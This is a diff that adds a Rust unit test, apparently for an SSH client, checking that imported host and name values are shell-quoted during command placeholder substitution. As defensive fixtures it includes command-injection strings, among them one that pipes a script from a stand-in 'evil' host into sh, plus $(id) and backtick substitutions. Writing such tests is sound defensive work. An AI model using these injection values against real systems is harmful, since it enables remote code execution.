@@ -680,6 +680,32 @@ fn placeholders_substitution() {
     assert_eq!(apply_command_placeholders("100%", &placeholders), "100%");
 }
 
+#[test]
+fn placeholder_values_cannot_inject_shell_syntax() {
+    // host/name 可来自 XShell / FinalShell / ssh_config 导入，导入链路不做
+    // 元字符过滤（host 只拒空白与 ://，name 只 trim）。替换发生在 shell 解析
+    // 之前，所以恶意名字若裸拼进命令串，`pass show %n` 会变成两条语句。
+    let evil = CommandPlaceholders::new(
+        "example.com; curl http://evil|sh",
+        "deploy$(id)",
+        2222,
+        "prod`id`box",
+    );
+    let substituted = apply_command_placeholders("pass show %n", &evil);
+    assert!(
+        substituted.starts_with("pass show '"),
+        "dangerous values must be quoted: {substituted}"
+    );
+    assert!(!substituted.contains("; curl"), "{substituted}");
+    let host = apply_command_placeholders("%h", &evil);
+    assert!(host.starts_with('\'') && host.ends_with('\''), "{host}");
+    let user = apply_command_placeholders("%u", &evil);
+    assert!(user.starts_with('\''), "{user}");
+    // 普通值保持原样，模板可读性不受影响。
+    let plain = CommandPlaceholders::new("example.com", "deploy", 2222, "prod-box");
+    assert_eq!(apply_command_placeholders("%n", &plain), "prod-box");
+}
+
 #[cfg(unix)] // echo 单引号语义依赖 POSIX shell，Windows 下无对应行为
 #[tokio::test]
 async fn execute_command_echo_positive_case() {
